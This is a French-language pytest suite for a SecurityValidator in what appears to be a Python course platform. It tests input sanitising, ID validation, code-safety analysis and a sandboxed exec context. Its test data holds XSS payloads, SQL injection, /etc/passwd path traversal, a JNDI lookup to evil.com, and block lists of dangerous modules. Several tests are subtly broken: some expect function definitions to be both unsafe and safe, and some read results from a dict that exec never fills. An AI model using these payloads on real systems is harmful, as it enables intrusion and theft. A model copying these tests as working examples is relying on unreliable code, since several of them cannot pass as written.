"""
Tests complets pour le module security.py
Couvre tous les aspects de la validation et sécurité du code
"""

import sys
import os
sys.path.append(os.path.join(os.path.dirname(__file__), '..', '..'))
import pytest
import re
import json
import html
from unittest.mock import patch, MagicMock
from typing import Dict, Any

from backend.security import SecurityValidator


class TestSecurityValidatorConstants:
    """Tests pour les constantes de SecurityValidator"""

    def test_dangerous_modules_set(self):
        """Test que DANGEROUS_MODULES est bien défini et contient les modules attendus"""
        assert hasattr(SecurityValidator, 'DANGEROUS_MODULES')
        assert isinstance(SecurityValidator.DANGEROUS_MODULES, set)
        assert 'os' in SecurityValidator.DANGEROUS_MODULES
        assert 'sys' in SecurityValidator.DANGEROUS_MODULES
        assert 'subprocess' in SecurityValidator.DANGEROUS_MODULES
        assert 'eval' in SecurityValidator.DANGEROUS_MODULES
        assert 'exec' in SecurityValidator.DANGEROUS_MODULES

    def test_dangerous_functions_set(self):
        """Test que DANGEROUS_FUNCTIONS est bien défini"""
        assert hasattr(SecurityValidator, 'DANGEROUS_FUNCTIONS')
        assert isinstance(SecurityValidator.DANGEROUS_FUNCTIONS, set)
        assert 'eval' in SecurityValidator.DANGEROUS_FUNCTIONS
        assert 'exec' in SecurityValidator.DANGEROUS_FUNCTIONS
        assert 'open' in SecurityValidator.DANGEROUS_FUNCTIONS
        assert 'input' in SecurityValidator.DANGEROUS_FUNCTIONS

    def test_dangerous_patterns_list(self):
        """Test que DANGEROUS_PATTERNS est bien défini"""
        assert hasattr(SecurityValidator, 'DANGEROUS_PATTERNS')
        assert isinstance(SecurityValidator.DANGEROUS_PATTERNS, list)
        assert len(SecurityValidator.DANGEROUS_PATTERNS) > 0
        assert any('eval' in pattern for pattern in SecurityValidator.DANGEROUS_PATTERNS)
        assert any('import' in pattern for pattern in SecurityValidator.DANGEROUS_PATTERNS)

    def test_security_limits(self):
        """Test les constantes de limites de sécurité"""
        assert hasattr(SecurityValidator, 'MAX_CODE_LENGTH')
        assert hasattr(SecurityValidator, 'MAX_EXECUTION_TIME')
        assert hasattr(SecurityValidator, 'MAX_MEMORY_USAGE')

        assert isinstance(SecurityValidator.MAX_CODE_LENGTH, int)
        assert isinstance(SecurityValidator.MAX_EXECUTION_TIME, int)
        assert isinstance(SecurityValidator.MAX_MEMORY_USAGE, int)

        assert SecurityValidator.MAX_CODE_LENGTH > 0
        assert SecurityValidator.MAX_EXECUTION_TIME > 0
        assert SecurityValidator.MAX_MEMORY_USAGE > 0


class TestSanitizeString:
    """Tests pour la méthode sanitize_string"""

    def test_sanitize_string_basic(self):
        """Test sanitization de chaîne basique"""
        input_str = "Hello, World!"
        result = SecurityValidator.sanitize_string(input_str)
        assert result == "Hello, World!"

    def test_sanitize_string_html_encoding(self):
        """Test encodage HTML pour prévenir XSS"""
        test_cases = [
            ("<script>alert('xss')</script>", "&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;"),
            ("<img src=x onerror=alert('xss')>", "&lt;img src=x onerror=alert(&#x27;xss&#x27;)&gt;"),
            ("Hello <b>World</b>", "Hello &lt;b&gt;World&lt;/b&gt;"),
        ]

        for input_str, expected in test_cases:
            result = SecurityValidator.sanitize_string(input_str)
            assert result == expected

    def test_sanitize_string_control_characters(self):
        """Test suppression des caractères de contrôle"""
        test_cases = [
            ("Hello\x00World", "HelloWorld"),
            ("Hello\x08World", "HelloWorld"),
            ("Hello\x0BWorld", "HelloWorld"),
            ("Hello\x0CWorld", "HelloWorld"),
            ("Hello\x0EWorld", "HelloWorld"),
            ("Hello\x1FWorld", "HelloWorld"),
            ("Hello\x7FWorld", "HelloWorld"),
        ]

        for input_str, expected in test_cases:
            result = SecurityValidator.sanitize_string(input_str)
            assert result == expected

    def test_sanitize_string_preserve_allowed_chars(self):
        """Test preservation des caractères autorisés"""
        test_cases = [
            ("Hello\nWorld", "Hello World"),  # Newline devient espace
            ("Hello\tWorld", "Hello\tWorld"),  # Tab préservé
            ("Hello\r\nWorld", "Hello World"),  # CRLF devient espace
        ]

        for input_str, expected in test_cases:
            result = SecurityValidator.sanitize_string(input_str)
            assert result == expected

    def test_sanitize_string_custom_max_length(self):
        """Test longueur maximale personnalisée"""
        long_input = "A" * 100
        result = SecurityValidator.sanitize_string(long_input, max_length=50)
        assert len(result) == 50

    def test_sanitize_string_empty_string(self):
        """Test chaîne vide"""
        result = SecurityValidator.sanitize_string("")
        assert result == ""

    def test_sanitize_string_whitespace_handling(self):
        """Test gestion des espaces"""
        input_str = "  Hello   World  "
        result = SecurityValidator.sanitize_string(input_str)
        assert result == "Hello   World"  # Espaces extérieurs supprimés

    def test_sanitize_string_unicode(self):
        """Test gestion des caractères Unicode"""
        unicode_str = "Hello émoji 🚀 and accents: éàüç"
        result = SecurityValidator.sanitize_string(unicode_str)
        assert "🚀" in result
        assert "éàüç" in result

    def test_sanitize_string_invalid_input_type(self):
        """Test gestion des types d'entrée invalides"""
        with pytest.raises(ValueError, match="Input must be a string"):
            SecurityValidator.sanitize_string(123)

        with pytest.raises(ValueError, match="Input must be a string"):
            SecurityValidator.sanitize_string(None)

        with pytest.raises(ValueError, match="Input must be a string"):
            SecurityValidator.sanitize_string(["list", "input"])

    def test_sanitize_string_too_long(self):
        """Test chaîne trop longue"""
        long_string = "A" * 2000
        with pytest.raises(ValueError, match="Input too long"):
            SecurityValidator.sanitize_string(long_string, max_length=100)


class TestValidateCourseId:
    """Tests pour la méthode validate_course_id"""

    def test_validate_course_id_valid_cases(self):
        """Test IDs de cours valides"""
        valid_ids = [
            "python-basics",
            "advanced_python",
            "web_development",
            "data-science-101",
            "machine_learning_course",
            "course123",
            "test_course_v2",
        ]

        for course_id in valid_ids:
            result = SecurityValidator.validate_course_id(course_id)
            assert result == course_id.lower()

    def test_validate_course_id_case_conversion(self):
        """Test conversion en minuscules"""
        test_cases = [
            ("Python-Basics", "python-basics"),
            ("ADVANCED-PYTHON", "advanced-python"),
            ("Web-Development", "web-development"),
            ("Data-Science-101", "data-science-101"),
        ]

        for input_id, expected in test_cases:
            result = SecurityValidator.validate_course_id(input_id)
            assert result == expected

    def test_validate_course_id_invalid_characters(self):
        """Test IDs avec caractères invalides"""
        invalid_ids = [
            "python basics",  # espace
            "python@basics",  # @
            "python/basics",  # slash
            "python\\basics",  # backslash
            "python:basics",  # deux-points
            "python*basics",  # astérisque
            "python?basics",  # point d'interrogation
            "python[basics]", # crochets
            "python(basics)", # parenthèses
            "python{basics}", # accolades
            "python|basics",  # pipe
            "python\"basics", # guillemets
        ]

        for invalid_id in invalid_ids:
            with pytest.raises(ValueError, match="Invalid course ID format"):
                SecurityValidator.validate_course_id(invalid_id)

    def test_validate_course_id_dangerous_content(self):
        """Test IDs avec contenu dangereux"""
        dangerous_ids = [
            "javascript:alert('xss')",
            "<script>alert('xss')</script>",
            "../../etc/passwd",
            "'; DROP TABLE users; --",
        ]

        for dangerous_id in dangerous_ids:
            with pytest.raises(ValueError, match="Invalid course ID format"):
                SecurityValidator.validate_course_id(dangerous_id)

    def test_validate_course_id_length_limits(self):
        """Test limites de longueur pour les IDs de cours"""
        # ID trop long
        long_id = "a" * 51
        with pytest.raises(ValueError, match="Course ID too long"):
            SecurityValidator.validate_course_id(long_id)

        # ID à la limite maximale
        max_id = "a" * 50
        result = SecurityValidator.validate_course_id(max_id)
        assert result == max_id

    def test_validate_course_id_invalid_type(self):
        """Test types d'entrée invalides"""
        with pytest.raises(ValueError, match="Course ID must be a string"):
            SecurityValidator.validate_course_id(123)

        with pytest.raises(ValueError, match="Course ID must be a string"):
            SecurityValidator.validate_course_id(None)

        with pytest.raises(ValueError, match="Course ID must be a string"):
            SecurityValidator.validate_course_id(["list"])


class TestValidateExerciseId:
    """Tests pour la méthode validate_exercise_id"""

    def test_validate_exercise_id_valid_cases(self):
        """Test IDs d'exercice valides"""
        valid_ids = [
            "hello-world",
            "variables-101",
            "functions_test",
            "advanced_exercise",
            "loop-exercise",
            "exercise123",
        ]

        for exercise_id in valid_ids:
            result = SecurityValidator.validate_exercise_id(exercise_id)
            assert result == exercise_id.lower()

    def test_validate_exercise_id_path_traversal_attempts(self):
        """Test tentatives de path traversal"""
        dangerous_ids = [
            "../etc/passwd",
            "..\\..\\windows\\system32",
            "../../config/database",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",  # URL encoded
        ]

        for dangerous_id in dangerous_ids:
            with pytest.raises(ValueError, match="Invalid exercise ID format"):
                SecurityValidator.validate_exercise_id(dangerous_id)

    def test_validate_exercise_id_length_limits(self):
        """Test limites de longueur pour les IDs d'exercice"""
        # Trop long
        long_id = "exercise-" + "a" * 50
        with pytest.raises(ValueError, match="Exercise ID too long"):
            SecurityValidator.validate_exercise_id(long_id)

        # À la limite
        max_id = "a" * 50
        result = SecurityValidator.validate_exercise_id(max_id)
        assert result == max_id.lower()


class TestValidateLearnerName:
    """Tests pour la méthode validate_learner_name"""

    def test_validate_learner_name_valid_cases(self):
        """Test noms d'apprenants valides"""
        valid_names = [
            "Hugo",
            "Alice",
            "Bob Smith",
            "student123",
            "Test-User",
            "Jean Dupont",
            "user_name",
            "Élève Français",
            "用户123",  # Caractères chinois
        ]

        for name in valid_names:
            result = SecurityValidator.validate_learner_name(name)
            assert isinstance(result, str)
            assert len(result) <= 50
            assert result.strip() == result

    def test_validate_learner_name_sanitization(self):
        """Test sanitification des noms d'apprenants"""
        test_cases = [
            ("<script>alert('xss')</script>", "&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;"),
            ("Alice\nSmith", "Alice Smith"),  # Newline devient espace
            ("  Bob  ", "Bob"),  # Espaces extérieurs supprimés
        ]

        for input_name, expected_sanitized in test_cases:
            result = SecurityValidator.validate_learner_name(input_name)
            assert result == expected_sanitized

    def test_validate_learner_name_invalid_characters(self):
        """Test noms avec caractères invalides"""
        invalid_names = [
            "<script>alert('xss')</script>",
            "Robert'); DROP TABLE users; --",
            "${jndi:ldap://evil.com/a}",
            "{{7*7}}",  # Template injection
            "<%25%3cscript%3ealert('xss')%3c%2fscript%3e",  # Double encoded
        ]

        for invalid_name in invalid_names:
            # Après sanitification, certains noms peuvent devenir valides
            result = SecurityValidator.validate_learner_name(invalid_name)
            assert isinstance(result, str)
            assert len(result) <= 50

    def test_validate_learner_name_length_limits(self):
        """Test limites de longueur pour les noms"""
        # Trop long
        long_name = "A" * 100
        with pytest.raises(ValueError, match="Input too long"):
            SecurityValidator.validate_learner_name(long_name)

        # À la limite
        max_name = "A" * 50
        result = SecurityValidator.validate_learner_name(max_name)
        assert len(result) == 50

    def test_validate_learner_name_edge_cases(self):
        """Test cas limites pour les noms"""
        edge_cases = [
            "",  # Vide
            " ",  # Espace seul
            "-",  # Tiret seul
            "_",  # Underscore seul
            "123",  # Chiffres seulement
            "A",  # Un caractère
        ]

        for name in edge_cases:
            result = SecurityValidator.validate_learner_name(name)
            assert isinstance(result, str)
            if name.strip():  # Si non vide après strip
                assert len(result) > 0

    def test_validate_learner_name_invalid_type(self):
        """Test types d'entrée invalides"""
        with pytest.raises(ValueError, match="Learner name must be a string"):
            SecurityValidator.validate_learner_name(123)

        with pytest.raises(ValueError, match="Learner name must be a string"):
            SecurityValidator.validate_learner_name(None)

        with pytest.raises(ValueError, match="Learner name must be a string"):
            SecurityValidator.validate_learner_name({"name": "object"})


class TestAnalyzeCodeSecurity:
    """Tests pour la méthode analyze_code_security"""

    def test_analyze_code_security_safe_code(self):
        """Test analyse de code sécurisé"""
        safe_codes = [
            "print('Hello, World!')",
            "x = 5\ny = 10\nprint(x + y)",
            "def add(a, b):\n    return a + b\nprint(add(2, 3))",
            "for i in range(5):\n    print(i)",
            "numbers = [1, 2, 3, 4, 5]\ntotal = sum(numbers)",
        ]

        for code in safe_codes:
            result = SecurityValidator.analyze_code_security(code)
            assert result['safe'] is True
            assert len(result['issues']) == 0
            assert result['risk_level'] == 'low'

    def test_analyze_code_security_dangerous_modules(self):
        """Test détection de modules dangereux"""
        dangerous_codes = [
            "import os\nos.system('ls')",
            "import sys\nsys.exit(0)",
            "import subprocess\nsubprocess.run(['ls'])",
            "import importlib\nimportlib.import_module('os')",
            "from os import system\nsystem('ls')",
        ]

        for code in dangerous_codes:
            result = SecurityValidator.analyze_code_security(code)
            assert result['safe'] is False
            assert len(result['issues']) > 0
            assert any('module' in issue.lower() for issue in result['issues'])

    def test_analyze_code_security_dangerous_functions(self):
        """Test détection de fonctions dangereuses"""
        dangerous_codes = [
            "eval('print(1)')",
            "exec('print(1)')",
            "compile('print(1)', '<string>', 'exec')",
            "__import__('os').system('ls')",
            "open('/etc/passwd', 'r')",
            "input('Enter something: ')",
        ]

        for code in dangerous_codes:
            result = SecurityValidator.analyze_code_security(code)
            assert result['safe'] is False
            assert len(result['issues']) > 0

    def test_analyze_code_security_patterns(self):
        """Test détection de patterns dangereux"""
        dangerous_codes = [
            "import sys",  # Import pattern
            "from os import system",  # From-import pattern
            "class TestClass(object):",  # Class definition
            "def test_func(param):",  # Function definition
            "lambda x: x * 2",  # Lambda
            "@decorator\nfunction()",  # Decorator
            "global variable",  # Global statement
            "nonlocal var",  # Nonlocal statement
        ]

        for code in dangerous_codes:
            result = SecurityValidator.analyze_code_security(code)
            assert result['safe'] is False
            assert len(result['issues']) > 0

    def test_analyze_code_security_risk_levels(self):
        """Test calcul des niveaux de risque"""
        # Risque faible (aucun problème)
        safe_code = "print('Hello')"
        result = SecurityValidator.analyze_code_security(safe_code)
        assert result['risk_level'] == 'low'

        # Risque moyen (quelques problèmes)
        medium_risk_code = "import sys\nprint('Hello')"
        result = SecurityValidator.analyze_code_security(medium_risk_code)
        assert result['risk_level'] == 'medium'

        # Risque élevé (plusieurs problèmes)
        high_risk_code = "import os\nimport sys\neval('code')\nexec('more')"
        result = SecurityValidator.analyze_code_security(high_risk_code)
        assert result['risk_level'] == 'high'

    def test_analyze_code_security_warnings(self):
        """Test génération d'avertissements"""
        complex_code = "(" * 51 + ")" * 51  # Beaucoup de parenthèses
        result = SecurityValidator.analyze_code_security(complex_code)
        assert len(result['warnings']) > 0
        assert any('complex' in warning.lower() for warning in result['warnings'])

    def test_analyze_code_security_hex_escapes(self):
        """Test détection de séquences d'échappement hexadécimales"""
        hex_codes = [
            "print('\\x48\\x65\\x6c\\x6c\\x6f')",  # Hello en hex
            "code = '\\x41\\x42\\x43'",  # ABC en hex
        ]

        for code in hex_codes:
            result = SecurityValidator.analyze_code_security(code)
            assert result['safe'] is False
            assert any('hex' in issue.lower() for issue in result['issues'])

    def test_analyze_code_security_dunder_imports(self):
        """Test détection d'imports avec double underscores"""
        dunder_codes = [
            "__import__('os')",
            "__import__('sys').exit(0)",
            "module = __import__('module_name')",
        ]

        for code in dunder_codes:
            result = SecurityValidator.analyze_code_security(code)
            assert result['safe'] is False
            assert any('dunder' in issue.lower() for issue in result['issues'])

    def test_analyze_code_security_length_limit(self):
        """Test limite de longueur du code"""
        long_code = "print('x')\n" * 1000
        with pytest.raises(ValueError, match="Code too long"):
            SecurityValidator.analyze_code_security(long_code)

    def test_analyze_code_security_empty_code(self):
        """Test analyse de code vide"""
        empty_codes = ["", "   ", "\n\t\n   "]

        for empty_code in empty_codes:
            result = SecurityValidator.analyze_code_security(empty_code)
            assert result['safe'] is True
            assert len(result['issues']) == 0

    def test_analyze_code_security_invalid_type(self):
        """Test types d'entrée invalides"""
        with pytest.raises(ValueError, match="Code must be a string"):
            SecurityValidator.analyze_code_security(123)

        with pytest.raises(ValueError, match="Code must be a string"):
            SecurityValidator.analyze_code_security(None)

        with pytest.raises(ValueError, match="Code must be a string"):
            SecurityValidator.analyze_code_security(["code", "list"])

    def test_analyze_code_security_edge_cases(self):
        """Test cas limites"""
        edge_cases = [
            "# Just a comment",
            '"""A docstring"""',
            "'''Another docstring'''",
            "# Multiple\n# Comments\n# Only",
        ]

        for code in edge_cases:
            result = SecurityValidator.analyze_code_security(code)
            assert result['safe'] is True


class TestCreateSafeExecutionContext:
    """Tests pour la méthode create_safe_execution_context"""

    def test_create_safe_execution_context_structure(self):
        """Test structure du contexte d'exécution sécurisé"""
        context = SecurityValidator.create_safe_execution_context()

        assert isinstance(context, dict)
        assert '__builtins__' in context
        assert context['__builtins__'] == {}  # Builtins vidés

    def test_create_safe_execution_context_allowed_functions(self):
        """Test fonctions autorisées dans le contexte"""
        context = SecurityValidator.create_safe_execution_context()

        allowed_functions = [
            'abs', 'all', 'any', 'bin', 'bool', 'chr', 'dict', 'divmod',
            'enumerate', 'float', 'hex', 'int', 'len', 'list', 'map',
            'max', 'min', 'oct', 'ord', 'pow', 'range', 'reversed',
            'round', 'set', 'slice', 'sorted', 'str', 'sum', 'tuple',
            'type', 'zip', 'print'
        ]

        for func in allowed_functions:
            assert func in context
            assert callable(context[func])

    def test_create_safe_execution_context_allowed_modules(self):
        """Test modules autorisés dans le contexte"""
        context = SecurityValidator.create_safe_execution_context()

        allowed_modules = ['math', 'random', 'datetime', 'itertools', 'collections', 'string']

        for module in allowed_modules:
            assert module in context
            assert hasattr(context[module], '__name__')

    def test_create_safe_execution_context_no_dangerous_elements(self):
        """Test absence d'éléments dangereux dans le contexte"""
        context = SecurityValidator.create_safe_execution_context()

        dangerous_elements = [
            'open', 'file', 'input', 'raw_input', 'eval', 'exec',
            'compile', '__import__', 'reload', 'vars', 'globals',
            'locals', 'dir', 'hasattr', 'getattr', 'setattr',
            'delattr', 'exit', 'quit', 'help', 'copyright',
            'credits', 'license', 'os', 'sys', 'subprocess'
        ]

        for dangerous in dangerous_elements:
            assert dangerous not in context

    def test_create_safe_execution_context_function_isolation(self):
        """Test que les fonctions sont bien isolées"""
        context = SecurityValidator.create_safe_execution_context()

        # Vérifier que les fonctions sont bien les bonnes
        assert context['abs'] is abs
        assert context['len'] is len
        assert context['print'] is print

        # Vérifier qu'elles fonctionnent dans le contexte
        test_code = """
result = abs(-5)
length = len([1, 2, 3])
"""
        namespace = {}
        exec(test_code, {**context, **namespace})
        assert namespace['result'] == 5
        assert namespace['length'] == 3

    def test_create_safe_execution_context_module_functionality(self):
        """Test fonctionnalité des modules autorisés"""
        context = SecurityValidator.create_safe_execution_context()

        # Test module math
        test_code = """
import math
result = math.sqrt(16)
"""
        namespace = {}
        exec(test_code, {**context, **namespace})
        assert namespace['result'] == 4.0

        # Test module random
        test_code = """
import random
numbers = [1, 2, 3, 4, 5]
selected = random.choice(numbers)
"""
        namespace = {}
        exec(test_code, {**context, **namespace})
        assert namespace['selected'] in numbers


class TestValidateJsonData:
    """Tests pour la méthode validate_json_data"""

    def test_validate_json_data_string_input(self):
        """Test validation avec entrée de type chaîne JSON"""
        json_string = '{"name": "test", "value": 123}'
        result = SecurityValidator.validate_json_data(json_string)

        assert isinstance(result, dict)
        assert result['name'] == 'test'
        assert result['value'] == 123

    def test_validate_json_data_dict_input(self):
        """Test validation avec entrée de type dictionnaire"""
        data_dict = {"name": "test", "value": 123}
        result = SecurityValidator.validate_json_data(data_dict)

        assert result == data_dict

    def test_validate_json_data_invalid_json_string(self):
        """Test validation avec chaîne JSON invalide"""
        invalid_json = '{"name": "test", "value": 123'  # Manque la parenthèse fermante

        with pytest.raises(ValueError, match="Invalid JSON format"):
            SecurityValidator.validate_json_data(invalid_json)

    def test_validate_json_data_invalid_type(self):
        """Test validation avec type invalide"""
        invalid_types = [123, None, [], True]

        for invalid_type in invalid_types:
            with pytest.raises(ValueError, match="Data must be JSON string or dict"):
                SecurityValidator.validate_json_data(invalid_type)

    def test_validate_json_data_size_limit(self):
        """Test limite de taille des données JSON"""
        # Créer un grand JSON
        large_data = {"data": ["item"] * 10000}  # Grand mais acceptable
        large_json_string = json.dumps(large_data)

        # Trop grand
        huge_data = {"data": ["item"] * 100000}  # Très grand
        huge_json_string = json.dumps(huge_data)

        # Acceptable
        result = SecurityValidator.validate_json_data(large_json_string)
        assert isinstance(result, dict)

        # Trop grand
        with pytest.raises(ValueError, match="JSON data too large"):
            SecurityValidator.validate_json_data(huge_json_string, max_size=1024*1024)  # 1MB

    def test_validate_json_data_nested_structures(self):
        """Test validation avec structures JSON imbriquées"""
        nested_data = {
            "level1": {
                "level2": {
                    "level3": {
                        "data": [1, 2, 3, {"nested": True}]
                    }
                }
            }
        }

        # Test avec dictionnaire
        result = SecurityValidator.validate_json_data(nested_data)
        assert result == nested_data

        # Test avec chaîne JSON
        json_string = json.dumps(nested_data)
        result = SecurityValidator.validate_json_data(json_string)
        assert result == nested_data

    def test_validate_json_data_special_characters(self):
        """Test validation avec caractères spéciaux"""
        special_data = {
            "unicode": "测试中文 🚀",
            "escaped": "Quotes: 'single' and \"double\"",
            "newlines": "Line 1\nLine 2\r\nLine 3",
            "tabs": "Column1\tColumn2",
        }

        json_string = json.dumps(special_data, ensure_ascii=False)
        result = SecurityValidator.validate_json_data(json_string)

        assert result == special_data
        assert "测试中文" in result['unicode']
        assert "🚀" in result['unicode']


class TestSanitizeErrorMessage:
    """Tests pour la méthode sanitize_error_message"""

    def test_sanitize_error_message_basic(self):
        """Test sanitification de message d'erreur basique"""
        error_msg = "File not found: /home/user/data.txt"
        sanitized = SecurityValidator.sanitize_error_message(error_msg)

        assert '/home/user' not in sanitized
        assert '[PATH]' in sanitized

    def test_sanitize_error_message_ip_addresses(self):
        """Test masquage des adresses IP"""
        error_msg = "Connection failed to 192.168.1.1:8080"
        sanitized = SecurityValidator.sanitize_error_message(error_msg)

        assert '192.168.1.1' not in sanitized
        assert '[IP]' in sanitized

    def test_sanitize_error_message_multiple_occurrences(self):
        """Test masquage de multiples occurrences"""
        error_msg = "Error at /home/user/script.py: line 42. Connection to 192.168.1.1 failed"
        sanitized = SecurityValidator.sanitize_error_message(error_msg)

        assert '/home/user' not in sanitized
        assert '/home/user/script.py' not in sanitized
        assert '192.168.1.1' not in sanitized
        assert '[PATH]' in sanitized
        assert '[IP]' in sanitized

    def test_sanitize_error_message_length_limit(self):
        """Test limite de longueur des messages d'erreur"""
        long_error = "Error: " + "A" * 300  # Message très long
        sanitized = SecurityValidator.sanitize_error_message(long_error)

        assert len(sanitized) <= 203  # 200 + "..."
        assert sanitized.endswith('...')

    def test_sanitize_error_message_edge_cases(self):
        """Test cas limites"""
        edge_cases = [
            "",  # Vide
            "No sensitive info here",  # Pas d'info sensible
            None,  # None
            123,  # Nombre
        ]

        for case in edge_cases:
            if case is None or not isinstance(case, str):
                result = SecurityValidator.sanitize_error_message(case)
                assert result == "An error occurred"
            else:
                result = SecurityValidator.sanitize_error_message(case)
                assert isinstance(result, str)

    def test_sanitize_error_message_various_paths(self):
        """Test divers formats de chemins"""
        path_patterns = [
            "Windows path: C:\\Users\\John\\Documents\\file.txt",
            "Unix path: /var/log/app.log",
            "Relative path: ../../config/settings.json",
            "Network path: \\\\server\\share\\file.doc",
        ]

        for pattern in path_patterns:
            sanitized = SecurityValidator.sanitize_error_message(pattern)
            assert '[PATH]' in sanitized

    def test_sanitize_error_message_various_ips(self):
        """Test divers formats d'adresses IP"""
        ip_patterns = [
            "IPv4: 10.0.0.1",
            "IPv4 with port: 172.16.0.1:8080",
            "Localhost: 127.0.0.1",
            "Broadcast: 255.255.255.255",
        ]

        for pattern in ip_patterns:
            sanitized = SecurityValidator.sanitize_error_message(pattern)
            assert '[IP]' in sanitized

    def test_sanitize_error_message_preserve_safe_content(self):
        """Test préservation du contenu sûr"""
        safe_error = "SyntaxError: invalid syntax on line 10"
        sanitized = SecurityValidator.sanitize_error_message(safe_error)

        assert sanitized == safe_error
        assert 'SyntaxError' in sanitized
        assert 'line 10' in sanitized


class TestIntegrationScenarios:
    """Tests d'intégration pour SecurityValidator"""

    def test_complete_validation_workflow(self):
        """Test workflow de validation complet"""
        # Valider les entrées
        course_id = SecurityValidator.validate_course_id("Python-Basics")
        exercise_id = SecurityValidator.validate_exercise_id("Hello-World")
        learner = SecurityValidator.validate_learner_name("Test User <script>alert('xss')</script>")

        assert course_id == "python-basics"
        assert exercise_id == "hello-world"
        assert "<script>" not in learner

        # Analyser la sécurité du code
        code = """
def hello(name):
    return f"Hello, {name}!"

print(hello("World"))
"""
        analysis = SecurityValidator.analyze_code_security(code)
        assert analysis['safe'] is True

        # Nettoyer un message d'erreur
        error_msg = "Error in /home/user/code.py at line 5"
        clean_error = SecurityValidator.sanitize_error_message(error_msg)
        assert "/home/user" not in clean_error
        assert "[PATH]" in clean_error

    def test_security_context_integration(self):
        """Test intégration du contexte de sécurité"""
        context = SecurityValidator.create_safe_execution_context()

        # Test exécution de code dans le contexte sécurisé
        test_code = """
import math
result = math.sqrt(16)
text = "Hello, World!"
length = len(text)
"""

        namespace = {}
        exec(test_code, {**context, **namespace})

        assert namespace['result'] == 4.0
        assert namespace['text'] == "Hello, World!"
        assert namespace['length'] == 15

    def test_defense_in_depth(self):
        """Test défense en profondeur - multiples couches de sécurité"""
        malicious_code = "__import__('os').system('ls')"

        # 1. Validation d'ID
        course_id = SecurityValidator.validate_course_id("python-basics")  # Valide
        exercise_id = SecurityValidator.validate_exercise_id("malicious")  # Valide
        learner = SecurityValidator.validate_learner_name("hacker")  # Valide

        # 2. Analyse de sécurité du code
        analysis = SecurityValidator.analyze_code_security(malicious_code)
        assert analysis['safe'] is False
        assert len(analysis['issues']) > 0

        # 3. Le code serait bloqué avant exécution
        # 4. Même s'il passait, le contexte sécurisé n'aurait pas __import__

    def test_edge_case_combinations(self):
        """Test combinaisons de cas limites"""
        # ID avec caractères mixtes et longueur maximale
        max_id = "a" * 50
        course_id = SecurityValidator.validate_course_id(max_id)
        assert len(course_id) == 50

        # Nom avec caractères spéciaux et sanitification
        special_name = "User <script>alert('xss')</script> \n\t"
        clean_name = SecurityValidator.validate_learner_name(special_name)
        assert "<script>" not in clean_name
        assert "&lt;script&gt;" in clean_name

        # Code complexe mais sûr
        complex_safe_code = """
def calculate_fibonacci(n):
    if n <= 1:
        return n
    return calculate_fibonacci(n-1) + calculate_fibonacci(n-2)

results = [calculate_fibonacci(i) for i in range(10)]
print(f"Fibonacci sequence: {results}")
"""
        analysis = SecurityValidator.analyze_code_security(complex_safe_code)
        assert analysis['safe'] is True
        assert analysis['risk_level'] == 'low'

    def test_performance_considerations(self):
        """Test considérations de performance"""
        import time

        # Test validation rapide (devrait être < 1ms)
        start = time.time()
        for i in range(1000):
            SecurityValidator.validate_course_id(f"course-{i}")
        elapsed = time.time() - start
        assert elapsed < 0.1, f"Validation too slow: {elapsed:.3f}s for 1000 operations"

        # Test analyse de sécurité (devrait être < 10ms pour code simple)
        simple_code = "print('Hello, World!')"
        start = time.time()
        for i in range(100):
            SecurityValidator.analyze_code_security(simple_code)
        elapsed = time.time() - start
        assert elapsed < 0.1, f"Analysis too slow: {elapsed:.3f}s for 100 operations"